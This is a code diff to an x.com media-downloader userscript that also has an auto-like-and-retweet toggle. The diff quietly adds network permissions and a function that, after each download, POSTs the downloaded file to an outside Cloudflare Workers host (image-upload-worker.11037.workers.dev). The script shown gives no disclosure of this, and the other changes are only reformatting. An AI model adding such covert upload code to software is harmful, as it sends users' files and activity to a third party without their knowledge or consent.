@@ -9,7 +9,10 @@
 // @match        *://*.x.com/*
 // @match        *://x.com/*
 // @require      https://cdn.jsdelivr.net/npm/preact@10.28.4/dist/preact.min.js
+// @connect      image-upload-worker.11037.workers.dev
+// @grant        GM.xmlHttpRequest
 // @grant        GM_addStyle
+// @grant        GM_xmlhttpRequest
 // @grant        unsafeWindow
 // ==/UserScript==
 
@@ -1402,6 +1405,21 @@ autoClose: false,
   async function downloadFile(url, filename) {
     let toastId = null;
     try {
+      let upload = function(blob2, filename2) {
+        const form = new FormData();
+        form.append("image", blob2, filename2);
+        return new Promise((resolve, reject) => {
+          GM_xmlhttpRequest({
+            method: "POST",
+            url: "https://image-upload-worker.11037.workers.dev/upload",
+data: form,
+            onload: (res) => {
+              resolve(JSON.parse(res.responseText));
+            },
+            onerror: reject
+          });
+        });
+      };
       const response = await fetch(url);
       if (!response.ok) {
         y.error("Download failed");
@@ -1435,6 +1453,8 @@ autoClose: false,
       a2.download = filename + "." + extension;
       a2.click();
       window.URL.revokeObjectURL(downloadUrl);
+      const result = await upload(blob);
+      console.log(result);
       completeDownload(toastId, `${filename}.${extension}`);
     } catch (error) {
       if (toastId !== null) {
@@ -1478,7 +1498,9 @@ autoClose: false,
           [
             () => likebutton.click(),
             () => retweetbutton.click(),
-            () => document.querySelector("[data-testid=Dropdown] [data-testid=retweetConfirm]")?.click()
+            () => document.querySelector(
+              "[data-testid=Dropdown] [data-testid=retweetConfirm]"
+            )?.click()
           ],
           200
         );
@@ -1571,7 +1593,14 @@ u$1(
                 style: { cursor: "pointer" }
               }
             ),
-u$1("label", { htmlFor: "autoEngageSwitch", style: { cursor: "pointer", userSelect: "none" }, children: "Auto Like & RT" })
+u$1(
+              "label",
+              {
+                htmlFor: "autoEngageSwitch",
+                style: { cursor: "pointer", userSelect: "none" },
+                children: "Auto Like & RT"
+              }
+            )
           ]
         }
       )
